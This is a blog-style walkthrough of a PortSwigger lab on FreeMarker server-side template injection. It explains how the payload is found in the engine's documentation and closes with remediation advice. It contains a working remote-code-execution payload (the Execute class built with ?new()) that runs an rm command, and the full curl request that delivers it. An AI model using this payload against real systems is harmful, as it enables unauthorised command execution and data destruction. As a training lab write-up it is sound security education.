---
layout: post
title: "PortSwigger: Server-side template injection using documentation"
date: 2027-11-18 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, SSTI]
tags: [portswigger, ssti, template-injection, freemarker, java, rce, cwe-1336, cwe-94]
---

This lab hands you a product-template editor and dares you to find the exploit by reading the template engine's own **documentation**. The engine is **FreeMarker** (Java), and the docs lead straight from "users can write templates" to "users can run shell commands." This is **server-side template injection** ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html) / [CWE-94](https://cwe.mitre.org/data/definitions/94.html)) ending in remote code execution.

## Overview

The goal is to delete `/home/carlos/morale.txt`, so we need OS command execution.

A *template* is an HTML skeleton with placeholders the app fills in with data. Logged in as the content manager (`content-manager:C0nt3ntM4n4g3r`), you can edit a product's template at `/product/template?productId=1`. Its default body already contains:

```
Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.
```

Those `${...}` placeholders are the tell. The app does not treat your text as plain data — it **compiles whatever you submit as a template** and renders it. Anything inside `${ }` is evaluated on the server.

The `${...}` syntax (not Jinja's `{{ }}`, not ERB's `<%= %>`) marks a **Java** engine. Here it is FreeMarker.

## Step 1 — confirm it evaluates

Put a maths probe in the template body and hit *Preview*:

```
${7*7}
```

The page renders **`49`**, not the literal text. The server is executing your expression.

## Step 2 — find the exploit in the docs

The lab is called "using documentation" because you are meant to *derive* the payload from FreeMarker's own pages:

1. The **FAQ** warns that letting users author templates is dangerous.
2. The **Built-in reference** describes `?new()`, which constructs a Java object from any class on the classpath that implements `TemplateModel`.
3. The **TemplateModel JavaDoc** lists those classes — including `freemarker.template.utility.Execute`, whose whole purpose is to run an OS command.

Chain those three pages and the exploit assembles itself.

## Step 3 — the exploit

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

- `<#assign ex=...?new()>` builds an instance of the `Execute` class.
- `${ ex("...") }` calls it, running the command as the JVM user.

The working request:

```bash
curl -s -b cookies.txt \
  --data-urlencode "csrf=<csrf>" \
  --data-urlencode 'template=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }' \
  --data-urlencode 'template-action=preview' \
  "https://<lab-id>.web-security-academy.net/product/template?productId=1"
```

Preview the template, the command runs, `morale.txt` is deleted, and the lab is **Solved**.

## Why it worked

FreeMarker ships **unsandboxed by default**. Its `?new()` built-in may instantiate *any* class implementing `TemplateModel`, and the engine bundles a ready-made `Execute` class that shells out to the OS. The instant user input is compiled as a template, "edit a product description" becomes "run commands on the server." Unlike Velocity (a Java-reflection gadget chain) or Thymeleaf/SpEL (a view-name preprocessing trick), FreeMarker needs nothing clever — one built-in plus one shipped class is the whole exploit.

## How to fix it

- **Never compile user-supplied content as a template.** Pass user values only as data-model variables into fixed, precompiled templates.
- If user-authored templates are truly required, restrict the class resolver so `?new()` can construct nothing:

  ```java
  Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
  cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
  ```

- Run the rendering process as a low-privilege user and keep sensitive files out of any path it can reach.
